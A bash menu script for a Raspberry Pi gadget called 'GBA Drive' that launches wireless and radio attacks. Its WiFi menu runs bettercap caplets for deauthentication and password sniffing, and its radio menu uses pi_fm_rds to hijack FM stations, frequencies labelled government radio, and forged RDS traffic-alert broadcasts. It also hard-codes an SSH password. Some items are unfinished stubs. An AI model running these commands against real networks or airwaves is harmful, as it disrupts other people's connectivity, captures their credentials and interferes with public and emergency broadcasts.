#!/bin/bash

# GBA Drive
# By Valou Tweak
# 10/07/2022 v1.0
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
#
#####################################################################
# MANDATORY REQUIREMENTS
#####################################################################
#
# See README.md
#
#####################################################################

# =======================================================================================
# ======================================= Helpers =======================================
# =======================================================================================

# Set timestamp
time_update () { NOW=$(date +"%Y-%m-%dT%H:%M:%S"); }

# Set main parameters
set_var () {
	# Generic variables
    NAME="GBA Drive"
	VERSION="1.0"
    LOGFILE="output.log"

    # Directories
    INSTALL_DIR="/opt/gbadrive"
    SHARE_DIR="/home/pi/Share"
    ASSET_DIR="$INSTALL_DIR/assets"
    LIST_DIR="$ASSET_DIR/lists"
    ASCII_DIR="$ASSET_DIR/ascii"
    SCRIPT_DIR="$ASSET_DIR/scripts"
    MUSIC_DIR="$SHARE_DIR/music"
    ROM_DIR="$SHARE_DIR/rom"

    # External tools
    FM_RDS="/opt/PiFmRds/pi_fm_rds"
    ROM_LOADER="python3 /opt/GBA-Multiboot-Python/multiboot.py"

    # Window configuration
    WIN_HEIGHT="16"
    WIN_WIDTH="45"
    MENU_HEIGHT="10"

    # Color configuration
    export DIALOGRC="$INSTALL_DIR/.dialogrc"

}

# Log MESSAGE to stdout and output.log
log () {
    time_update
    local file="$LOGFILE";
    printf '%b' "$NOW $1" '\n' | tee -a "$file"
}

# Log error MESSAGE to stderr and output.log
log_error () {
    local file="$LOGFILE"
    local message="ERROR: $1"
    log "$message"
}

# Check privileges and dependencies
check_dependencies() {

    # Test root
    if [ "$EUID" -eq 0 ]; then
        log "$NAME runs as root"
    else
        log_error "You need to run $NAME as root"
        exit 1
    fi

    # Test dialog dependency
    which dialog > /dev/null 2>&1
    if [ "$?" -ne 0 ]; then
        log_error "Dialog package not found"
        exit 1
    fi
}

# Check provided action and run it if selected by user
# TODO comment
run_action() {
    action="$1"
    authorized_actions=("action_wifi","action_bluetooth","action_radio","action_ir","action_rfid","action_rom","action_wip")
    if [ "$(echo $authorized_actions | grep -w -o $action)" == "$action" ] ; then
        case $return in
        0)
            #echo "'$choice' chosen"
            $action ;;
        1)
            # Cancel pressed
            menu ;;
        255)
            # ESC pressed
            clear && exit 1 ;;
        esac
    else
        log_error "Cannot recognize selected action: $action"
        menu
    fi
}

# =======================================================================================
# ================================= Main Menu - Level 1 =================================
# =======================================================================================

menu() {
    # Update timestamp
    time_update
	tmpfile=`tmpfile 2>/dev/null` || tmpfile=/tmp/test$$
	trap "rm -f $tmpfile" 0 1 2 5 15
	clear
    log "Enter main menu"
	dialog --clear --backtitle "$NAME" --title "$NAME $VERSION" \
    --menu "Choose an option:" $WIN_HEIGHT $WIN_WIDTH $MENU_HEIGHT \
	1 "WiFi" \
    2 "Bluetooth" \
    3 "Radio" \
    4 "Infrared" \
    5 "RFID" \
    6 "Load GBA ROM" \
    7 "Kitty" \
    8 "Stealth mode" \
	9 "Help" \
	10 "Shutdown" 2> $tmpfile

	return=$?
	choice=`cat $tmpfile`

	case $return in
        0)
    	    #echo "'$choice' chosen"
    	    selected ;;
        1)
    	    # Cancel pressed
            log "Cancel pressed, exiting"
    	    clear && exit 1 ;;
        255)
    	    # ESC pressed
            log "ESC pressed, exiting"
    	    clear && exit 1 ;;
	esac
}

# =======================================================================================
# ================================= Sub Menu - Level 2 ==================================
# =======================================================================================

selected () {
	case $choice in
		1)
            # WiFi Menu
            log "Enter WiFi menu"

            dialog --title "WiFi Menu" --menu "Choose an option:" \
            $WIN_HEIGHT $WIN_WIDTH $MENU_HEIGHT \
            1 "[wlan0] Connect to default AP" \
            2 "[wlan1] Create hotspot" \
            3 "[wlan1] Deauth attack" \
            4 "[wlan1] Capture passwords" \
            5 "[wlan1] Capture network" 2> $tmpfile

            return=$?
            choice=`cat $tmpfile`

            run_action action_wifi ;;
		2)
            # Bluetooth Menu
            log "Enter Bluetooth menu"

            dialog --title "Bluetooth Menu" --menu "Choose an option:" \
            $WIN_HEIGHT $WIN_WIDTH $MENU_HEIGHT \
            1 "Create network hotspot" \
            2 "Act as gamepad" \
            3 "Recon nearby devices" \
            4 "Recon BLE nearby devices" \
            5 "Capture packets" 2> $tmpfile

            return=$?
            choice=`cat $tmpfile`

            run_action action_bluetooth ;;
		3)
            # Radio Menu
            log "Enter radio menu"

            dialog --title "Radio Menu" --menu "Choose an option:" \
            $WIN_HEIGHT $WIN_WIDTH $MENU_HEIGHT \
            1 "[76-108 MHz] Hijack FM radio" \
            2 "[1-250 MHz] Hijack Gov radio" \
            3 "[107.7 MHz] Hijack FM TA alerts" \
            4 "[433 MHz] Capture signal" \
            5 "[433 MHz] Replay signal" \
            6 "[868 MHz] Capture signal" \
            7 "[868 MHz] Replay signal" 2> $tmpfile

            return=$?
            choice=`cat $tmpfile`

            run_action action_radio ;;
		4)
            # Infrared Menu
            log "Enter infrared menu"
            dialog --title "Infrared Menu" --menu "Choose an option:" \
            $WIN_HEIGHT $WIN_WIDTH $MENU_HEIGHT \
            1 "Capture" \
            2 "Replay" \
            3 "Shutdown TVs" 2> $tmpfile

            return=$?
            choice=`cat $tmpfile`

            run_action action_wip ;;
		5)
            # RFID Menu
            log "Enter RFID menu"
            dialog --title "RFID Menu" --menu "Choose an option:" \
            $WIN_HEIGHT $WIN_WIDTH $MENU_HEIGHT \
            1 "Scan" \
            2 "Capture" \
            3 "Replay" 2> $tmpfile

            return=$?
            choice=`cat $tmpfile`

            run_action action_wip ;;
        6)
            # GBA ROM Loader
            log "Enter GBA ROM menu"
            action_rom
            menu
            ;;
        7)
            # Kitty
            log "Display Kitty"

            # Number of ascii file to random on
            file_number=$(ls -1 $ASCII_DIR/*.ascii | wc -l)
            # Select random Kitty
            # (-2 is for the hello and bye bye ascii pictures, we don't want to display them)
            random_select=$((1+$RANDOM%($file_number-2)))
            # Display Kitty
            dialog  --title "Level: 1 |============........| level 2" \
            --msgbox "$(cat $ASCII_DIR/kitty_$random_select.ascii)" \
            $WIN_HEIGHT $WIN_WIDTH
            menu
            ;;
        8)
            # Stealth mode
            # Disable all wireless connections
            log "Run stealth mode"

            # Disable wireless things
            ifconfig wlan0 down
            ifconfig wlan1 down
            systemctl stop bluetooth btnap hostapd
            rfkill unblock wlan
            killall pi_fm_rds
            killall dumpcap
            killall tcpdump
            killall bettercap

            # Display instructions
            dialog dialog  --title "$NAME" --msgbox "\nStealth mode enabled: no WiFi, BT or radio broadcast running.\nEach interface will be bring up again as needed when activating the appropriate action." \
            $WIN_HEIGHT $WIN_WIDTH

            menu
            ;;
        9)
            # Help
            log "Enter help menu"

            header="$NAME Script\n[ Version \"$VERSION\" ]\n\n"
            add_wifi="How to connect a new WiFi network?\nEdit the file /etc/wpa_supplicant/wpa_supplicant.conf while using 'wpa_passphrase SSID PASSWORD' command output.\n\n"
            add_bluetooth="How to pair a new bluetooth device?\nSSH into $NAME, run 'bluetoothclt' (no need root access) and use 'scan on' to scan bluetooth MAC addresses, then 'pair MAC_ADDRESS' then 'trust MAC_ADDRESS' and finally 'quit'.\n\n"
            ssh_co="How to SSH into $NAME? Connect to the same network (WiFi connect, WiFi hotspot, Bluetooth hotspot) and ssh to:\npi@gbadrive.local\npassword: gbadrive\n\n"
            radio_music="How to add broadcasted sounds on radio?\nYou can add your .wav files (no MP3) in $MUSIC_DIR\n\n"
            gba_rom="How to add ROM into $NAME?\nYou can add your .mb.gba files (multiboot ROM only) in $ROM_DIR\n\n"
            level_up="How to level up my Kitty?\nYou can explore and run actions in $NAME to gain xp, then level up. Each level will unlock a new \n\n"
            dialog --title "$NAME" --msgbox "$header$add_wifi$add_bluetooth$ssh_co$radio_music$gba_rom$level_up" $WIN_HEIGHT $WIN_WIDTH
            menu
            ;;
		10)
            # Exit
            log "Shutdown pressed"
            clear;
            dialog --title "$NAME" --msgbox "\n$(cat $ASCII_DIR/kitty_zz.ascii)\n            Bye bye =D" \
            $WIN_HEIGHT $WIN_WIDTH
            clear ; shutdown -h now
            ;;
	esac
}

# =======================================================================================
# ================================ Action Menu - Level 3 ================================
# =======================================================================================

# WiFi actions
action_wifi () {
    # Update time
    time_update
    case $choice in
		1)
            log "Connect to default WiFi AP"

            # Turn WiFi on via internal wlan0
            # Reset dns and default route
            ifconfig wlan0 down
            ifconfig wlan0 up
            echo "nameserver 9.9.9.9" > /etc/resolv.conf
            # route add default gw 192.168.1.1 # --> does not seem to be necessary anymore
            dialog --title "Connect WiFi" --msgbox \
            "\nTrying connection to default WiFi AP:\n\n SSID: Mobile_AP\n Password: try to hack me ;)" \
            $WIN_HEIGHT $WIN_WIDTH
            ;;
        2)
            log "Run WiFi hotspot"

            # Turn WiFi hotspot via external adapter wlan1
            ifconfig wlan1 down
            ifconfig wlan1 up
            # Free up radio transmissions
            rfkill unblock wlan
            # Start hotspot
            systemctl start hostapd
            dialog --title "Hotspot" --msgbox \
            "\Running WiFi hotspot:\n\n SSID: GBA Drive\n WPA: gbadrive" \
            $WIN_HEIGHT $WIN_WIDTH
            # Shutdown hotspot and external wlan1 interface
            systemctl stop hostapd
            ifconfig wlan1 down
            ;;
		3)
            log "Run WiFi deauth attack"

            # Set external interface wlan1 to monitor mode
            ifconfig wlan1 down
            ifconfig wlan1 up
            # Free up radio transmissions
            rfkill unblock wlan
            clear ; airmon-ng check kill
            # Start monitor mode
            airmon-ng start wlan1
            # Then run deauth attack via bettercap
            cmd="bettercap -iface wlan1mon -caplet /usr/local/share/bettercap/caplets/pita.cap"
            log "Execute $cmd" ; $cmd
            dialog --title "Deauth" --msgbox \
            "\nDeauth attack stopped\n\nHandshake capture stopped" $WIN_HEIGHT $WIN_WIDTH
            airmon-ng stop wlan1
            ;;
        4)
            log "Run WiFi password sniffer"

            # Set external interface wlan1 to monitor mode
            ifconfig wlan1 down
            ifconfig wlan1 up
            clear ; airmon-ng check kill
            # Free up radio transmissions
            rfkill unblock wlan
            # Start monitor mode
            airmon-ng start wlan1
            # Then run deauth attack via bettercap
            cmd="bettercap -iface wlan1mon -caplet /usr/local/share/bettercap/caplets/simple-passwords-sniffer.cap"
            log "Execute $cmd" ; $cmd
            dialog --title "Password sniffer" --msgbox \
            "\nPassword sniffer stopped" $WIN_HEIGHT $WIN_WIDTH
            airmon-ng stop wlan1
            ;;
        5)
            log "Run WiFi capture"

            # Set external interface wlan1 to monitor mode
            ifconfig wlan1 down
            ifconfig wlan1 up
            # Free up radio transmissions
            rfkill unblock wlan
            clear ; airmon-ng check kill
            # Start monitor mode
            airmon-ng start wlan1
            # Start capture
            cmd="dumpcap -i wlan1mon -w '$SHARE_DIR/captures/wifi_capture_$NOW.pcapng'"
            log "Execute $cmd" ; $cmd
            dialog --title "Network capture" --msgbox "\nCapture stopped" $WIN_HEIGHT $WIN_WIDTH
            ;;
    esac

    # Return to main menu
    menu
}

# Bluetooth actions
action_bluetooth() {
    # Update time
    time_update
    # Enable bluetooth
    systemctl start bluetooth
    # Disable discoberability
    bluetoothctl discoverable off

    case $choice in
        1)
            log "Run Bluetooth hotspot"

            # Enable Bluetooth
            systemctl start btnap
            # Restart DHCP server with new interface
            systemctl restart dnsmasq
            # Enable discoberability
            bluetoothctl discoverable on
            dialog --title "Bluetooth hotspot" --msgbox \
            "\nRunning Bluetooth network hotspot" $WIN_HEIGHT $WIN_WIDTH
            # Disable discoverable and then bluetooth
            bluetoothctl discoverable off
            systemctl stop btnap
            ;;
        2)
            log "Run Bluetooth gamepad"

            dialog --title "Bluetooth gamepad" --msgbox \
            "\nRunning Bluetooth gamepad mode \nWork in progress..." \
            $WIN_HEIGHT $WIN_WIDTH
            ;;
        3)
            log "Run Bluetooth recon"

            clear
            cmd="$SCRIPT_DIR/recon_bt.sh"
            log "Execute $cmd" ; $cmd
            dialog --title "Bluetooth recon" --msgbox \
            "\nRecon stopped" $WIN_HEIGHT $WIN_WIDTH
            ;;
        4)
            log "Run BLE recon"

            clear
            cmd="$SCRIPT_DIR/recon_ble.sh"
            log "Execute $cmd" ; $cmd
            dialog --title "Bluetooth LE recon" --msgbox \
            "\nRecon stopped" $WIN_HEIGHT $WIN_WIDTH
            ;;
        5)
            log "Run BT packet capture"

            clear
            cmd="tcpdump -i bluetooth0 -w '$SHARE_DIR/captures/bt_capture_$NOW.pcap'"
            log "Execute $cmd" ; $cmd
            dialog --title "Bluetooth recon" --msgbox \
            "\nRecon stopped" $WIN_HEIGHT $WIN_WIDTH
            ;;
    esac

    # Stop bluetooth
    systemctl stop bluetooth
    # Return to main menu
    menu
}

# Radio actions
action_radio() {
    case $choice in
        1)
            log "[76-108 MHz] Hijack standard FM"

            # Select frequency for broadcast
            dialog --title "[76-108 MHz] Hijack standard FM" \
            --radiolist "Select frequency:" \ $WIN_HEIGHT $WIN_WIDTH $MENU_HEIGHT \
            $(cat $LIST_DIR/fm_frq.list) 2> $tmpfile

            return=$?
            choice=`cat $tmpfile`

            if [ $return -eq 0 ] ; then
                frequencies=($(cut -d " " -f 2 "$LIST_DIR/fm_frq.list"))
                frq=${frequencies[$choice-1]}

                # Select track to broadcast
                dialog --title "Select file" --fselect "$MUSIC_DIR" \
                $WIN_HEIGHT $WIN_WIDTH 2> $tmpfile

                return=$?
                if [ $return -ne 0 ] ; then
                    menu
                fi
                song=$(cat $tmpfile)

                # Run radio hijack
                clear ; log "Hijack $frq with $song"
                cmd="$FM_RDS -freq $frq -ps 'PiraDio' -rt 'Hacked by a Game Boy...' -audio $song"
                log "Execute $cmd" ; $cmd

                dialog --title "[$frq] Hijack FM radio" --msgbox \
                " \nHijacking stopped" $WIN_HEIGHT $WIN_WIDTH
            fi ;;
        2)
            log "[1-250 MHz] Hijack Gov radio"

            # Select frequency for broadcast
            dialog --title "[1-250 MHz] Hijack Gov radio" \
            --radiolist "Select frequency:" \ $WIN_HEIGHT $WIN_WIDTH $MENU_HEIGHT \
            $(cat $LIST_DIR/fm_frq_unrestricted.list) 2> $tmpfile

            return=$?
            choice=`cat $tmpfile`

            if [ $return -eq 0 ] ; then
                frequencies=($(cut -d " " -f 2 "$LIST_DIR/fm_frq_unrestricted.list"))
                frq=${frequencies[$choice-1]}

                # Select track to broadcast
                dialog --title "Select file" --fselect "$MUSIC_DIR" \
                $WIN_HEIGHT $WIN_WIDTH 2> $tmpfile

                return=$?
                if [ $return -ne 0 ] ; then
                    menu
                fi
                song=$(cat $tmpfile)

                # Run radio hijack
                clear ; log "Hijack $frq with $song"
                cmd="$FM_RDS -freq $frq -ps 'PiraDio' -rt 'Hacked by a Game Boy...' -audio $song"
                log "Execute $cmd" ; $cmd

                dialog --title "[$frq] Hijack Gov radio" --msgbox \
                " \nHijacking stopped" $WIN_HEIGHT $WIN_WIDTH

                # Terminate radio hijacking (hust to be sure, governments...)
                killall pi_fm_rds
            fi ;;
        3)
            clear
            log "[107.7 MHz] Hijack FM TA alerts"

            # Run radio hijack
            cmd="$FM_RDS -freq '107.7' -ctl rds_ctl -audio $MUSIC_DIR/noise.wav &"
            log "Execute $cmd" ; $cmd

            # Hijack TA alerts
            echo "PS PiraDio" >> rds_ctl
            echo "RT Hacked by a Game Boy..." >> rds_ctl
            echo "TA ON" >> rds_ctl
            echo "Ctrl-c to quit" ; cat
            dialog --title "[107.7 MHz] Hijack FM TA alerts" --msgbox \
            "\nHijacking stopped" $WIN_HEIGHT $WIN_WIDTH

            # Terminate radio hijacking
            killall pi_fm_rds
            ;;
        4)
            log "[433 MHz] Capture signal"

            dialog --title "[433 MHz] Capture signal" --msgbox \
            "\nWork in progres..." $WIN_HEIGHT $WIN_WIDTH
            # Capture radio signal
            ;;
        5)
            log "[433 MHz] Replay signal"

            # Choose signal to repeat
            dialog --title "Select file" --fselect "$SHARE_DIR/captures" \
            $WIN_HEIGHT $WIN_WIDTH 2> $tmpfile

            return=$?
            if [ $return -ne 0 ] ; then
                menu
            fi
            repeat_signal=$(cat $tmpfile)

            # Replay radio signal
            dialog --title "[433 MHz] Replay signal" --msgbox \
            "\nReplay stopped" $WIN_HEIGHT $WIN_WIDTH
            ;;
        6)
            log "[868 MHz] Capture signal"

            dialog --title "[868 MHz] Capture signal" --msgbox \
            "\nWork in progres..." $WIN_HEIGHT $WIN_WIDTH
            # Capture radio signal
            ;;
        7)
            log "[868 MHz] Replay signal"

            # Choose signal to repeat
            dialog --title "Select file" --fselect "$SHARE_DIR/captures" \
            $WIN_HEIGHT $WIN_WIDTH 2> $tmpfile

            return=$?
            if [ $return -ne 0 ] ; then
                menu
            fi
            repeat_signal=$(cat $tmpfile)

            # Replay radio signal
            dialog --title "[868 MHz] Replay signal" --msgbox \
            "\nReplay stopped" $WIN_HEIGHT $WIN_WIDTH
            ;;
    esac

    # Return to main menu
    menu
}

# Infrared actions
action_ir() {
    case $choice in
		1)
            log "Infrared capture"
            dialog --title "Infrared capture" --msgbox \
            "\nSniffing infrared..." $WIN_HEIGHT $WIN_WIDTH
            ;;
        2)
            log "Infrared replay"
            # Choose signal to repeat
            dialog --title "Select file" --fselect "$SHARE_DIR/captures" \
            $WIN_HEIGHT $WIN_WIDTH 2> $tmpfile

            return=$?
            if [ $return -ne 0 ] ; then
                menu
            fi
            repeat_signal=$(cat $tmpfile)
            # Replay radio signal
            dialog --title "Infrared replay" --msgbox \
            "\nReplay stopped" $WIN_HEIGHT $WIN_WIDTH
            ;;
        3)
            log "Shutdown TVs"
            dialog --title "Shutdown TVs" --msgbox \
            "\nReady to shoot them all?" $WIN_HEIGHT $WIN_WIDTH
            ;;
    esac

    # Return to main menu
    menu
}

# RFID actions
action_rfid() {
    case $choice in
		1)
            log "RFID scan"
            dialog --title "RFID scan" --msgbox \
            "\nScanning RFID..." $WIN_HEIGHT $WIN_WIDTH
            ;;
        2)
            log "RFID capture"
            dialog --title "RFID capture" --msgbox \
            "\nCapturing RFID..." $WIN_HEIGHT $WIN_WIDTH
            ;;
        3)
            log "RFID replay"
            # Choose signal to repeat
            dialog --title "Select file" --fselect "$SHARE_DIR/captures" \
            $WIN_HEIGHT $WIN_WIDTH 2> $tmpfile

            return=$?
            if [ $return -ne 0 ] ; then
                menu
            fi
            repeat_signal=$(cat $tmpfile)
            # Replay radio signal
            dialog --title "RFID replay" --msgbox \
            "\nReplaying RFID..." $WIN_HEIGHT $WIN_WIDTH
            ;;
    esac

    # Return to main menu
    menu
}

# GBA ROM loader action
action_rom() {
    log "Run GBA ROM loader"

    # Default game
    dialog --title "Select file" --fselect "$ROM_DIR" \
    $WIN_HEIGHT $WIN_WIDTH 2> $tmpfile

    return=$?
    if [ $return -ne 0 ] ; then
        menu
    fi
    rom_filepath=$(cat $tmpfile)

    dialog --title "GBA ROM loader instructions" --msgbox \
    "\n1) Press OK \n2) Shutdown GBA \n3) Power on GBA without game \n4) Enjoy ! \n5) Reboot GBA when finished" \
    $WIN_HEIGHT $WIN_WIDTH

    log "Loading $rom_filepath as multiboot single pack ROM"
    # Kill GBA streaming
    killall "gbarplay.sh" "raspi.run"
    # Send ROM
    cmd="$ROM_LOADER '$rom_filepath'"
    log "Execute $cmd" ; $cmd
    sleep 10
    reboot
}

# Function for dev mode only
action_wip() {
    log "Work in progress..."
    dialog --title "[WIP]" --msgbox \
    "\nWork in progress" $WIN_HEIGHT $WIN_WIDTH

    # Return to main menu
    menu
}

# =======================================================================================
# ========================================= Main ========================================
# =======================================================================================

# Set environnement
time_update
set_var
# Check for root privileges and dependencies
log "Checking dependencies..."
check_dependencies
log "Starting menu..."
# Say Welcome =)
dialog --title "$NAME" --msgbox \
"\n$(cat $ASCII_DIR/kitty_hi.ascii)\n          Hello buddy =D" \
$WIN_HEIGHT $WIN_WIDTH
# Run the oneko tamagotchi
oneko -tora -rv &
# Run the main menu
menu
